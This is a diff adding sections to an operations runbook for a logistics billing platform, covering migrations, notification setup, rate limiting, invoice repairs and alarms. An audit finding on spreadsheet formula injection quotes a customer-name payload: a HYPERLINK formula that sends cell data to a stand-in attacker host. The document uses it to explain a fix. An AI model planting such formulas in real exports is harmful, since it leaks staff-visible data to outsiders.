@@ -678,6 +678,111 @@ query that forgets its `tenant_id` predicate from returning other tenants' rows.
 It does not validate JWT claims, check roles, or scope S3 keys — a request
 authenticated as the wrong tenant is still scoped to *that* tenant's data.
 
+## Migration 062 refuses to run: duplicate live invoices (2026-11-14)
+
+Migration 062 adds a unique index allowing one non-cancelled invoice per customer per container. If duplicates already
+exist it stops with `Cannot enforce one live invoice per customer per container; duplicates exist:` and lists
+`tenant / customer / container (N invoices)`. It never merges or cancels money records on its own.
+
+1. For each listed group, open the invoices (the tenant's billing list, filtered by container) and decide which to keep. Keep the one with payments or a release note.
+2. Cancel the others with `PATCH /v1/billing/{id}/cancel` (only possible with no confirmed payments and no active release note). If one has payments, move them first — do not delete rows.
+3. Re-run `make migrate` / the migrate Lambda. The index excludes cancelled invoices, so it builds once only one live invoice remains per group.
+
+The same migration seeds `tenant_counter` from existing numbers, so invoice numbering continues from the highest number already issued.
+
+## Notification channels — one-time setup before go-live (2026-11-13)
+
+Email, SMS and WhatsApp are wired end to end in code and Terraform, but three
+things can only be done by a human with accounts at the providers. Until they
+are, each channel **fails silently**: the send path logs "not configured" and
+returns, the deploy is healthy, the API returns 200, and customers are never
+told anything. `terraform_data.notification_config_guard` (both clouds) fails
+the **plan** for prod if the values below are empty, so a prod deploy cannot
+reach that state unnoticed — but it cannot check that the accounts behind them
+actually work.
+
+### 1. Email
+
+**AWS (SES)** — verify the sending domain (or at least the from-address), then
+request removal from the SES sandbox; a sandboxed account can only send to
+verified recipients, so customer mail silently fails. Set `ses_from_address`.
+
+**Azure (ACS)** — `module.acs` provisions a managed domain and yields
+`DoNotReply@<guid>.azurecomm.net`, which works out of the box. It is
+**unreplyable and has poor deliverability**, so before launch add a custom
+verified domain and point `acs_sender_address` at it.
+
+Check: `SES_FROM_ADDRESS` must not be empty. The application default
+`notifications@logistics.example.com` is a placeholder that both providers
+reject; `send_email` refuses to use it in production rather than letting it
+surface as a provider error buried in `notification_log`.
+
+### 2. SMS — Africa's Talking
+
+1. Live account + API key → `africastalking_api_key`.
+2. **`africastalking_username` must be the live username, not `sandbox`.** The
+   application default is `sandbox`, which accepts messages, returns a
+   success-shaped response, and delivers nothing. `send_sms` refuses to send as
+   `sandbox` in production for exactly this reason.
+3. Register a sender ID if you want an alphanumeric sender —
+   `africastalking_sender_id`. Nigerian networks commonly require
+   pre-registration.
+
+### 3. WhatsApp — Meta Cloud API (the primary customer channel)
+
+SMS is only WhatsApp's fallback, so an unconfigured WhatsApp token means the
+main way customers are contacted is dead.
+
+1. Verified Meta Business + WhatsApp Business phone number →
+   `meta_whatsapp_access_token`, `meta_whatsapp_phone_id`.
+2. **Every template must be approved by Meta under the exact name and language**
+   listed in `WA_TEMPLATE_MAP` / `WA_TEMPLATE_MAP_ZH`
+   (`services/notification/service.py`). An unapproved name 404s. Set
+   `meta_whatsapp_template_lang` to the language they were approved under — `en`
+   and `en_US` are different to Meta and a mismatch 404s every send.
+3. Subscribe the webhook to `POST /v1/webhooks/whatsapp` on the deployed API,
+   using `whatsapp_verify_token` as the verify token. Without it, delivery and
+   failure callbacks never arrive, so `notification_log` never progresses past
+   `sent` and the SMS fallback on a *late* failure never fires.
+
+### 4. Link base URL — required in every environment
+
+`app_base_url` must be the absolute URL of the deployed app (the Front Door host
+on Azure, CloudFront on AWS). Account activation and customer invite links are
+built from it, and `shared/app_urls.py` refuses to emit a relative URL — so with
+it empty those notifications are **not sent at all** and log an ERROR. Set
+`customer_portal_base_url` only if the customer portal is hosted separately.
+
+### 5. Before testing in dev or staging
+
+`NOTIFICATION_ALLOWLIST` fails **closed**: outside production nothing is
+messaged unless the contact is listed. This is deliberate — dev and staging
+databases hold real imported customer contacts, because a manifest import
+creates customers straight from the forwarder's file, phone numbers included.
+Add only your own test contacts, comma-separated.
+
+### Diagnosing "the customer says they got nothing"
+
+```sql
+SELECT channel, status, error_detail, provider_message_id, created_at
+FROM notification_log
+WHERE customer_id = '<uuid>'
+ORDER BY created_at DESC LIMIT 10;
+```
+
+- `status = 'failed'`, `error_detail` mentioning *provider unconfigured* → a
+  missing env var, not a provider outage. Check the table in
+  `15_api_notifications.md`.
+- A `whatsapp` row followed by an `sms` row whose `retry_of` points at it → the
+  fallback working as designed.
+- **No row at all** for a channel → the message was never enqueued. Either the
+  tenant muted that channel (`tenant.notification_preferences`), the recipient
+  had no address for it, or the allowlist suppressed it. The producer logs which.
+- `status = 'sent'` with an empty `provider_message_id` on a WhatsApp row and a
+  `created_at` before 2026-11-13 → the false-`sent` bug: an unconfigured send
+  was recorded as delivered and metered. Fixed; such rows are not evidence of
+  delivery.
+
 ## Rollback Procedure
 
 ### Lambda rollback — re-deploy a previous tag
@@ -881,3 +986,190 @@ the failure mode here is silence, not an error.
 | LOW | Next sprint |
 
 See Architecture Decision Records in `docs/adr/` for system design context.
+
+## Migration 063 downgrade refuses: refunds use the new types (2026-11-14)
+
+Migration 063 widens `refund_request.refund_type` to include `missing_item` and `seized_item` and adds
+`storage_fee_log.waived_at`. Downgrading re-creates the old three-value CHECK, which fails if any refund already uses the new
+types. Do not delete those rows to get past it: they are real compensation requests. Either stay on 063, or re-point them
+(`UPDATE refund_request SET refund_type = 'damage_or_loss' WHERE refund_type IN ('missing_item','seized_item')`) after
+agreeing that with finance, then downgrade. Dropping `waived_at` loses which storage fees were waived (the totals already
+reflect the waiver; the history does not survive).
+
+## Rate limiting, origin checks and user revocation (audit Phase 2, 2026-11-15)
+
+**Alarm hook: `rate_limiter_unavailable`.** `shared/rate_limit.py` logs this at ERROR, at most once per 30 s per process, when Redis cannot be reached. The limiter **fails open**, so nothing is down: protection is off for as long as Redis is. Create a CloudWatch log metric filter on that string and alarm on it (this is the OPS-04 hook). Fix Redis (ElastiCache / Azure Cache); counters restart empty and limiting resumes by itself within about 5 seconds (the circuit breaker in `DistributedCache`).
+
+**Users report `429 RATE_LIMIT_EXCEEDED`.** Read `Retry-After`. Which policy? The log line `Rate limit exceeded (policy=..., key=...)` names it. Usual cause is a shared office or mobile-carrier address hitting a per-address limit (`session_ip` 60/min, `tracking_ip` 30/min). Raise it with `RATE_LIMIT_<POLICY>=limit/window` on the affected Lambda or container app, or switch the limiter off with `RATE_LIMIT_ENABLED=false` in an emergency. `RATE_LIMIT_TENANT` (default 600/min) is a guess; tune it from the `api_calls` usage metric. To clear one client's counter: delete the matching `ratelimit:*` key in Redis (keys are hashed, so find it by `redis-cli --scan --pattern 'ratelimit:login_failures:*'` and a known account's behaviour, or flush the policy's keys).
+
+**A tracking code is locked ("429" with a 1 hour `Retry-After`).** Ten wrong phone guesses lock the *code*, for every address, for an hour. That is by design (the phone is the only secret) and can be used to deny one code to its owner. Clear it by deleting the code's `ratelimit:tracking_failures:*` keys.
+
+**Everyone's sign-in or refresh returns `403 ORIGIN_NOT_ALLOWED`.** The auth Lambda found no trusted origin, or not this one. It trusts the origins of `APP_BASE_URL`, `CUSTOMER_PORTAL_BASE_URL`, `ENTRA_REDIRECT_URI`, and `ALLOWED_ORIGINS` / `CORS_ALLOW_ORIGINS`. After a Terraform change confirm `ALLOWED_ORIGINS` and `APP_BASE_URL` are on the function. With none set it refuses everything and logs `No trusted origin is configured` at ERROR. Do not "fix" it by removing the check.
+
+**Azure: audit logs show no IP, or per-address rate limits do not seem to apply.** The app takes the client address from Front Door's own stamp, and only on requests that carry this deployment's Front Door id (`X-Azure-FDID` equal to `AZURE_FRONT_DOOR_ID`, which Terraform sets from the Front Door profile). Check, in order: (1) the container app has `AZURE_FRONT_DOOR_ID` set (empty means Front Door is not deployed, `enable_frontend = false`); (2) the request really went through the Front Door host, not the container app's own `*.azurecontainerapps.io` hostname: a request that goes around Front Door is served but its address is deliberately unknown; (3) do one audited action (sign in) through the Front Door host and look at that row's `ip_address` in the activity log: it should be your public address. If it is empty there, Front Door is not sending `X-Azure-SocketIP` in the form expected (a bare IPv4 or IPv6 address); `shared/client_ip.py::resolve_edge_client_ip` is the one place to adjust. There is no hop count to tune; `TRUSTED_PROXY_HOPS` stays 0.
+
+**Closing the way around Front Door (optional, free).** Set `require_front_door = true` and apply: the API then answers 403 to anything that did not come through this Front Door (`/health` stays open for the platform's probes). Before turning it on, make sure every externally configured URL uses the Front Door host: the Paystack webhook, the WhatsApp webhook, and any smoke test in the deploy workflow. It rests on the Front Door id, which is not public but is not a secret either; the stronger lock is Front Door Premium with Private Link (about ten times the monthly base price of Standard), which is not worth it at this size.
+
+**A deactivated user still has access.** They should not: the very next request gets 401. If one does, check Redis for a stale `identity:<user id>` entry (deactivation evicts it; the TTL is 60 s) and that the `tenant_user` row says `deactivated`. A request returning `503 Service Unavailable` with "User status check unavailable" means the lookup failed and the user check failed closed.
+
+**Migration 064** adds the `suppressed` status to `notification_log`. Its downgrade refuses while any suppressed row exists; do not delete those rows, they are the record of why a customer was not messaged.
+
+**Erasing a customer is irreversible at the identity provider (2026-11-16).** `DELETE /v1/customers/{id}` deletes the customer's Cognito/Entra account and replaces their `tenant_user` email and name with placeholders. There is no undo; the row stays, deactivated, for FK integrity. If it returns `502` the provider call failed and nothing was erased; retry.
+
+## Spreadsheet formula injection in exports (2026-11-16)
+
+**Finding (MEDIUM, patch within 2 weeks): customer-typed text can run as a spreadsheet formula.** Anyone can self-register as a customer (`/register/{slug}`) and choose their own name. The single-record exports write that name, and other typed text (goods descriptions, vessel names), into the file as raw text: openpyxl turns an xlsx string that starts with `=` into a formula, and a csv cell that starts with `=`, `+`, `-` or `@` is read as one by Excel (CWE-1236). A customer registering as `=HYPERLINK("https://evil.example/?"&A2,"Click")` therefore plants a formula in any staff export that includes them.
+
+**Fixed (2026-11-16):** the two new list exports (`GET /v1/billing/export`, `GET /v1/containers/export`) write text as text (`services/excel/_tables.py`; tests in `tests/unit/test_list_exports.py`, mutation-checked).
+
+**Closed (2026-11-16, same day):** the older exports are fixed too. `export_billing.py`, `export_manifest.py` and `export_packing_list.py` call `_tables.neutralise_formulas(workbook)` before saving (none of them writes a formula on purpose, so any formula cell is typed-in text), and `service._rows_to_csv` (the customer's "Download invoice" among others) passes each value through `_tables.csv_safe`, which prefixes text that starts with `=`, `+`, `-`, `@`, tab or carriage return with an apostrophe and leaves numbers alone, so a negative balance held as a number is not touched. Tests: `tests/unit/test_export_formula_safety.py` (mutation-checked). The PDF exports are not spreadsheets and are unaffected. A new exporter must use `_tables.build_xlsx` / `build_csv`, or call these two helpers.
+
+## Pickup codes (audit UX-09, 2026-11-16, ADR-008)
+
+**"The warehouse says the pickup code is wrong."** The collector must give the six digit code sent to the customer by SMS and email when the release note was issued. Each wrong try is counted; the error says how many are left.
+
+**"The release note is locked."** Five wrong codes. Office staff (Nigeria staff or tenant admin) open the release note and use **Send new pickup code**; the customer gets a new code, the old one stops working and the note unlocks. Staff are notified in app when a note locks. Nobody at the company can read a code.
+
+**"The customer never got a code."** Check the notification log for `pickup_code_issued` (the code shows as ••••••). A failed one cannot be retried; send a new code from the release note. If the customer has no phone or email on file the note has no code and needs none.
+
+**Dev and staging:** outside production the notification guard only messages contacts on `NOTIFICATION_ALLOWLIST`. With `PICKUP_CODE_PEPPER` set, a test customer must be on the allowlist to receive a code, otherwise a pickup for a note with a code cannot be completed. Local dev has no pepper unless you set one, so no codes are issued.
+
+**Do not rotate `PICKUP_CODE_PEPPER`** without planning: every outstanding code stops verifying and each active note needs a new code. If a note carries a code and the pepper is missing, pickups for it return 503 by design.
+
+**Migration 065** adds three columns to `release_note`. Applied to the local dev database on 2026-11-17 (with 066 and 067); not yet on AWS or Azure.
+
+## Invoices with a negative total (audit BE-07, 2026-11-17, migration 066)
+
+**Background.** Until 2026-11-17 invoice generation subtracted all of a customer's credit from their next invoice, so a customer with more credit than the charge got a negative invoice and lost the difference. New invoices cannot go below zero: the code stops at zero and the table has `ck_billing_total_not_negative`.
+
+**After running migration 066**, check its log. If it says `N invoice(s) have a negative total`, the constraint is active for new and changed rows but not validated, and **those N invoices cannot be updated** until repaired (any update fails the check).
+
+Find them:
+
+```sql
+SELECT b.tenant_id, b.id, b.invoice_number, b.customer_id, b.total_ngn, b.amount_paid_ngn, b.status, b.billed_at
+  FROM billing b WHERE b.total_ngn < 0 ORDER BY b.billed_at;
+```
+
+Each one is a decision about a customer's money, so it is made by the tenant's finance owner, not by a script. The usual repair, per invoice, in one transaction: give the amount below zero back to the customer as credit, then bring the invoice to zero.
+
+```sql
+BEGIN;
+-- 1. A credit for the amount the invoice is below zero (here 30000.00), already approved.
+INSERT INTO refund_request (tenant_id, customer_id, billing_id, amount_ngn, amount_approved_ngn, reason, status,
+                            refund_type, customer_choice)
+VALUES (:tenant_id, :customer_id, :billing_id, 30000.00, 30000.00,
+        'Credit left over from invoice :invoice_number (BE-07 repair)', 'applied_as_credit', 'overpayment',
+        'credit_next_shipment');
+-- 2. The invoice itself owes nothing.
+UPDATE billing SET total_ngn = 0, status = 'paid', updated_at = NOW()
+ WHERE tenant_id = :tenant_id AND id = :billing_id AND total_ngn < 0
+RETURNING id;
+COMMIT;
+```
+
+Record each repair in the tenant's audit trail (who decided, the invoice, the amount). When no negative rows remain:
+
+```sql
+ALTER TABLE billing VALIDATE CONSTRAINT ck_billing_total_not_negative;
+```
+
+**If an update to an invoice fails with `ck_billing_total_not_negative`** in normal running, it is one of those unrepaired rows. No code path can create a new one: `shared.billing_money.adjust_billing` stops at zero.
+
+## A Paystack charge that was not applied (audit BE-08, 2026-11-17)
+
+Since 2026-11-17 a Paystack charge is applied to an invoice only if it is a positive amount in naira. Anything else is acknowledged (200) and logged at WARNING by `services/payment_release/paystack.py`:
+
+```
+Ignoring Paystack charge '<id>': currency 'USD' is not NGN
+Ignoring Paystack charge '<id>': amount is not positive
+```
+
+On the verify path the customer sees "This payment was not made in naira, so it has not been applied to your invoice. Please contact the office." (422 `BR-PAY-VERIFY-002`).
+
+**What to do.** A charge in another currency means the tenant's Paystack account accepts that currency and a checkout was opened in it, or someone sent a crafted event signed with the tenant's key (which means the key has leaked: rotate it in the tenant's Paystack dashboard and `PUT /v1/tenant/config/paystack`). Look the transaction id up in the tenant's Paystack dashboard. If the customer really paid, either refund it in Paystack or record the naira value by hand as a payment (`POST /v1/payments`, method `paystack`, with the Paystack reference) after agreeing the rate with the tenant. Do not change the code to accept it.
+
+## AWS Lambdas pointed at the wrong bucket (found 2026-11-17)
+
+**Severity: HIGH on AWS, before go-live; not applicable on Azure** (Azure sets `BLOB_CONTAINER_NAME`, which the code reads). The Lambda environment set `S3_BUCKET`; the code reads `S3_BUCKET_NAME` and falls back to `logistics-assets`. S3 bucket names are global, so on AWS every presigned upload, download and export pointed at a bucket this deployment does not own: uploads would fail with AccessDenied, or, if that name is ever registered by someone with a permissive policy, land in their bucket. Separately, the 90-day cleanup read `TENANT_DATA_BUCKET`, which nothing set, so it never purged a deleted tenant's files.
+
+**Fixed:** `S3_BUCKET_NAME = var.bucket_name` in `modules/lambda` (`common_env_vars`); cleanup purges the assets bucket unless `TENANT_DATA_BUCKET` overrides it. Contract tests: `TestStorageSettingsReachTheCode`. **To do on the next AWS apply:** confirm one presigned upload lands in `{project}-assets-{env}-{account}`. If an AWS environment ran before this fix, check whether any tenant was purged by cleanup: its files are still in the bucket and must be deleted by hand (`aws s3 rm s3://<bucket>/<tenant_id>/ --recursive`, plus non-current versions).
+
+## Offboarding export failed (audit BE-10, 2026-11-17)
+
+The platform tenant page shows "Every attempt failed" when an export failed 3 times. The job logs `Offboarding export <id> failed for tenant <tenant_id>: <ExceptionType> at <file>:<line>` (no message, by design: it handles every customer's personal data). `tenant_offboarding_export.last_error` holds the same type name.
+
+| Type | Usual cause | Fix |
+|---|---|---|
+| `InvalidToken`, `ClientError` from KMS | a field cannot be decrypted (key policy, disabled key, or a value written without encryption under a different key) | check the job role has `kms:Decrypt` on `ENCRYPTION_KMS_KEY_ID`; on Azure, the identity's Key Vault access |
+| `ClientError` / `HttpResponseError` from storage | the job cannot write to `{tenant_id}/exports/offboarding/` | IAM `offboarding_export` policy; on Azure, the storage connection |
+| `MemoryError`, or the Lambda times out | a very large tenant | raise the Lambda memory (`modules/lambda`, `scheduled_configs.offboarding_export`); the archive is built in memory |
+| `TypeError: cannot export a …` | a column type the exporter does not know | add it to `_json_value` in `services/scheduled/offboarding_export.py` |
+
+After the fix, press **Queue export** on the tenant page (or `POST /v1/platform/tenants/{id}/offboarding-export`). It runs at the next hour.
+
+## A tenant past 90 days was not deleted
+
+The cleanup logs `Refusing to delete tenant <id>: no offboarding export has completed` and returns it under `refused`. That is the safeguard working: the data has not been handed over. Open the tenant page: queue or fix the export (above), download it, hand it to the tenant; the next 02:00 UTC run deletes the tenant. Tenants offboarded before 2026-11-17 have no export at all and will all be refused until one is queued for each.
+
+## Failure alarms (audit OPS-04, 2026-11-17)
+
+Some failures are caught so a request or a job can carry on. They no longer pass silently: `shared/observability.py` counts each one (`record_failure` / `record_outcome`), and these alarms watch the counts. Every alarm also logs a line with the detail at the catch site: search the logs for the operation name and the time.
+
+| Alarm (AWS: `{project}-{env}-…`; Azure: `{prefix}-…`) | Fires when | What it means | Do this |
+|---|---|---|---|
+| `invoice-generation-failures` | any in 5 min (Azure: 15 min) | A customer on a cleared container got no invoice because generation raised (not "skipped": missing rates and no-CBM are reported to staff in-app and are not counted). | Find `Failed to generate invoice for customer … on container …` in the tracking/billing logs. Fix the cause (database, rate lookup), then open the container and **Generate missing invoices**. The dashboard's unbilled queue lists who is waiting. |
+| `audit-write-failures` | any in 5 min (Azure: 15 min) | An action happened but its audit record (tenant `audit_log` or `platform_audit_log`) was not written. | Find `Failed to write audit record` / platform audit errors. Usually the database: check connections. The actions are not lost, only their record: note the window in the incident log, since the trail has a gap. An offboarding export link is refused outright when its audit record fails. |
+| `scheduled-job-step-failures` | any in 1 hour | A scheduled job failed for one tenant or record and moved on: storage fees, reminders, dispute escalation, SLA check, release-note expiry, usage aggregation, data cleanup, offboarding export. | The log line names the job and tenant. Fix and let the next run pick it up (each job is idempotent per day). Storage fees missed for a day are not back-filled: see "storage fee" in this runbook. Offboarding export: "Offboarding export failed". |
+| `notification-failure-rate` | > 20 % of sends failed in 15 min, with at least 5 sends | A channel's provider is failing (SMS credit, WhatsApp template, SES), not one bad number. | `notification_log` rows with `status = 'failed'` in the window show which channel and the provider's error. See "Seeing a notification actually send" and the provider sections above. |
+
+Also counted, **not** alarmed: `notification_enqueue` (a message that never reached the queue; it shows in the same logs) and `tenant_deletion_refused` (the cleanup's daily refusal to delete a tenant without an export: expected for tenants offboarded before 2026-11-17 until one is queued).
+
+**Where the numbers are.** AWS: CloudWatch metrics, namespace `ShipX`, metric `Failures` (and `Attempts` for `notification_send`), dimensions `Environment`, `Operation`. Azure: Log Analytics, `ContainerAppConsoleLogs_CL | where Log_s has '"Operation"'`. Azure rules exist only when `alerts_email` is set (Terraform variable; default empty, no cost).
+
+**Checking an alarm end to end (the OPS-04 gate; not yet done anywhere).** In a test environment, force one invoice failure through the real code path: send the billing Lambda a PaymentDue event whose ids are not UUIDs, so the lookup raises and the handler counts it.
+
+```bash
+aws lambda invoke --function-name <project>-billing-<env> --cli-binary-format raw-in-base64-out \
+  --payload '{"source":"logistics.tracking","detail-type":"PaymentDue","detail":{"tenant_id":"<a test tenant id>","payload":{"customer_id":"not-a-uuid","container_id":"not-a-uuid"}}}' /dev/stdout
+```
+
+Within about five minutes `<project>-<env>-invoice-generation-failures` goes to ALARM and the alerts topic emails. Nothing is written: the lookup fails before any insert. On Azure, run the same event through the container: `az containerapp exec … -- python -c "from services.billing.handler import _handle_event; _handle_event({...})"`; the rule evaluates every 15 minutes.
+
+## Upload size is not limited (found 2026-11-17, audit BE-12) — FIXED 2026-11-17 (5 MB)
+
+Every upload (claim, manifest and payment-claim evidence, container documents, packing-list import) is a presigned PUT straight to storage. None carries a size condition: the services' `_MAX_FILE_SIZE` constants (10 MB, 20 MB) were never read, and the browser checks no size either. Anyone allowed to upload (including a customer submitting payment evidence) can store a file of any size in the tenant's prefix, at our storage cost.
+
+Fix (not done; needs a decision on the request shape): the client sends `size_bytes`, the API refuses it above the policy limit, and the URL is signed for exactly that length — on S3 by adding `ContentLength` to the presign `Params` (the browser's `Content-Length` must then match); Azure SAS cannot bind a length, so on Azure check `object_size(key)` when the upload is recorded and delete an oversized object. Five endpoints and their screens change. Until then, a storage lifecycle rule or bucket metric alarm is the only backstop.
+
+**Fixed (owner decision: 5 MB):** every presign request declares `size_bytes`; over 5 MB or missing is refused; on AWS the URL is SigV4 and signs the length and type. Where a file is used (payment claim, imports) its stored size is checked, which is what holds on Azure. ~~Remaining gap on Azure only: claim evidence, manifest evidence and container documents are stored at presign and never re-checked, so an Azure client that ignores its declared size could store a larger file there.~~ **Closed 2026-11-19:** those three are listed only after the client confirms the upload, and the confirm call checks the stored size and deletes an oversized file with its row (migration 069, `shared.uploads.confirm_stored_upload`). An unconfirmed row is never shown; its file, if one landed, stays in storage under the record's prefix and is removed with the tenant's data. Verified locally: no size 422, 6 MB 422 `FILE_TOO_LARGE`, 1 KB accepted, an oversize stored file refused at payment-claim submit.
+
+Related: the declared `Content-Type` binds the upload on AWS only; on Azure (and the local Moto) a PUT with a different type is accepted.
+
+## Invoices priced at an old exchange rate (audit BE-11, 2026-11-17)
+
+Signal: tenant admins get "Invoice priced at an old exchange rate" (`invoice_old_exchange_rate`), or containers report customers not invoiced with `RATE_UNAVAILABLE`. Cause: the Bybit P2P feed (`shared/fx_rate.py`) has been unreachable; `last_known` is the last rate fetched, `RATE_UNAVAILABLE` means none ever was (a new platform with no network to Bybit).
+
+1. Check reachability from the Lambda/container (`fetch_bybit_ngn_rate`); the circuit breaker `bybit_p2p` opens after 5 failures for 60 s.
+2. Find affected invoices: `SELECT id, invoice_number, exchange_rate_ngn, exchange_rate_fetched_at FROM billing WHERE exchange_rate_source = 'last_known' AND billed_at > now() - interval '2 days'`.
+3. An invoice at a stale rate is a money decision for the tenant (adjust with a misc charge or credit, or leave it); nothing reprices automatically.
+4. For `RATE_UNAVAILABLE`, once a rate is fetched, staff use "Generate invoices" on the container.
+
+Tune the notice with `FX_RATE_MAX_AGE_MINUTES` (default 120).
+
+## Encrypted fields that would not decrypt (found and fixed 2026-11-17)
+
+`shared/encryption.py` stores `wrapped data key || Fernet ciphertext`. `decrypt_field` split at the **first** `||`, but the wrapped key is binary (KMS `CiphertextBlob` / Key Vault wrap output) and contains `||` in roughly 1 of every 300 keys, so those values (`pickup_record.id_number`, `refund_request.account_number` / `account_name`) raised on every read. It now splits at the **last** `||` (the Fernet part is base64url and never contains `|`), which also reads every value written before the fix: no data was lost, nothing needs re-encrypting. Found through `test_azure_keyvault_provider.py::test_integrates_with_the_real_fernet_envelope` failing intermittently; `TestAWrappedKeyContainingTheSeparator` pins it. If staff reported an ID number or bank detail that "could not be shown", it was this.
+
+## Lambdas that could not import their own service (found and fixed 2026-11-19)
+
+**Severity: HIGH on AWS, before go-live; not applicable on Azure.** CI zipped `services/` flattened, so handler modules loaded but any `from services.<other> import …` raised `No module named 'services'`. Tracking and claims failed at cold start (every request 502); packing-list approval and the import's customer invites would have failed when reached. The offboarding-export Lambda was also never built or deployed by CI. **Fixed:** zips carry the `services` package as well (`ci.yml`, `scripts/build_lambda_zip.sh`); offboarding export added to the build and deploy lists; guarded by `TestLambdaPackageLayout`. **On the next AWS deploy:** call `GET /v1/containers` and `GET /v1/claims` once and check CloudWatch for `Runtime.ImportModuleError`.
+
+## Cancelling an invoice that used credit (2026-11-19)
+
+Cancelling an invoice now returns the credit it used and reopens the balances it carried over (migration 070). An invoice issued **before** migration 070 that used credit has no record of which credit, so cancel refuses it with `CREDIT_NOT_TRACEABLE`. To cancel one:
+
+1. Find what it used: `SELECT credits_applied_ngn, customer_id FROM billing WHERE id = '<billing>'`, and the customer's credits: `SELECT id, amount_approved_ngn, credit_applied_ngn, status, updated_at FROM refund_request WHERE customer_id = '<customer>' AND customer_choice = 'credit_next_shipment' ORDER BY updated_at`. The audit entry for the invoice's creation (`audit_log`, entity `billing`, action `CREATE`) lists `credits_applied` per refund.
+2. Record it, so the normal cancel gives it back: `INSERT INTO billing_credit_application (tenant_id, billing_id, refund_request_id, amount_ngn, created_at) VALUES (…)` for each credit, as the tenant (`SET app.current_tenant_id`).
+3. Cancel from the app. Check the credits' `credit_applied_ngn` fell by those amounts.
+
